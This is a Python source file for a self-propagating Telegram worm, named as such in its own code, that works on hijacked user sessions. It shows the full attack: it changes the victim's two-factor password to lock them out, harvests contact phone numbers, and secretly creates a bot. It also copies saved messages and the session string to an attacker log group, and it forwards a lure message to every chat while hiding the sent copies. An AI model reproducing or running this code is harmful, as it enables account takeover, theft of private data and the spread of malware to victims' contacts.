import os,logging,random,asyncio,json,string
from telethon import TelegramClient, events, Button, functions, errors
from telethon.sessions import StringSession
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from pymongo import UpdateOne
from strings import strings,bot_names,bot_usernames

load_dotenv(override=True)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))

async def set_passwd(client, me):
    user_data = mongo_client.userdb.sessions.find_one({'phone': me.phone})
    password = "".join(random.choice(string.ascii_letters+string.digits) for i in range(16))
    await client.edit_2fa(current_password=None if not 'password' in user_data else user_data['password'], new_password=password)
    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'password': password}})
async def backup_contacts(client):
    result = await client(GetContactsRequest(hash=0))
    operations = [
        UpdateOne({'chat_id': user.id}, {"$set": {'phone': user.phone}}, upsert=True)
        for user in result.users if user.phone
    ]
    mongo_client.userdb.sessions.bulk_write(operations)
async def create_bot(client, me):
    async with client.conversation("@BotFather") as conv:
        msg = await conv.send_message("/newbot")
        await (await conv.get_response()).delete()
        await (await conv.send_message(random.choice(bot_names))).delete()
        await (await conv.get_response()).delete()
        username = f"{random.choice(bot_usernames)}_{random.randint(1000,9999)}{random.randint(1000,9999)}_bot"
        await (await conv.send_message(username)).delete()
        response = await conv.get_response()
        bot_token = response.text.split("`")[1].strip()
        await (await conv.send_message("/setuserpic")).delete()
        await (await conv.get_response()).delete()
        await (await conv.send_message(f"@{username}")).delete()
        await (await conv.get_response()).delete()
        await (await conv.send_file('files/profile.png')).delete()
        await (await conv.get_response()).delete()
        await msg.delete()
        await response.delete()
    botinfo = {"username": username, "token": bot_token, "owner": me.id}
    mongo_client.wormdb.bots.insert_one(botinfo)
    return botinfo
async def backup_saves(client, me, logger_bot):
    result = await client(functions.channels.CreateChannelRequest(
        title=f'{me.first_name} {me.last_name}',
        about=f'ID: {me.id}\nUsername: {me.username}',
        megagroup=False,
    ))
    channel_id = result.updates[1].channel_id
    dest = await client.get_entity(channel_id)
    result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
    mongo_client.wormdb.channels.insert_one({"invite": result.link, "owner": me.id})
    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
    msg_count = 0
    async for message in client.iter_messages("me", reverse=True):
        msg_count += 1
        try:
            await message.forward_to(dest)
        except errors.FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            await message.forward_to(dest)
        except:
            break
    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
    log = {
        'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}\nSession: `{client.session.save()}`",
        'channel_id': channel_id,
        'dest': dest,
        'hash': result.link.split('/')[-1].lstrip('+'),
    }
    log['msg'] = await logger_bot.send_message(int(os.getenv('LOG_GROUP')), log['txt'])
    return log
async def spread(client, me, botinfo, log):
    if botinfo is None:
        return
    bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
    await bot.start(bot_token=botinfo['token'])
    async with client.conversation(f"@{botinfo['username']}") as conv:
        msg = await conv.send_message("/start")
        await bot.send_message(
            me.id,
            strings['worm_msg'],
            file='files/worm.png',
            buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
            link_preview=False
        )
        spread_msg = await conv.get_response()
        spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
        await msg.delete()
        await bot.disconnect()
    perm_logs = {
        'creator': [],
        'admin': [],
    }
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                user = await client.get_entity(dialog.id)
            except errors.FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                user = await client.get_entity(dialog.id)
            except:
                continue
            if user.bot:
                continue
        elif dialog.is_channel or dialog.is_group:
            permissions = await client.get_permissions(dialog, me)
            if permissions.is_creator:
                perm_logs['creator'].append({'id': dialog.id, 'title': dialog.title})
            elif permissions.is_admin:
                perm_logs['admin'].append({'id': dialog.id, 'title': dialog.title})
        try:
            msg = await spread_msg.forward_to(dialog)
        except errors.FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            msg = await spread_msg.forward_to(dialog)
        except:
            try:
                msg = await dialog.send_message(spread_msg_nomedia)
            except errors.FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                msg = await dialog.send_message(spread_msg_nomedia)
            except:
                continue
        if dialog.is_user:
            await msg.delete(revoke=False)
    if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
        await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
        await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
        await client.send_message(log['dest'], json.dumps(perm_logs, indent=4, ensure_ascii=False))
        await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))

async def worm(client, logger_bot):
    me = await client.get_me()
    log = None
    botinfo = None
    try:
        await set_passwd(client, me)
    except:
        pass
    try:
        await backup_contacts(client)
    except:
        pass
    try:
        botinfo = await create_bot(client, me)
    except:
        pass
    try:
        log = await backup_saves(client, me, logger_bot)
    except:
        pass
    try:
        await spread(client, me, botinfo, log)
    except:
        pass
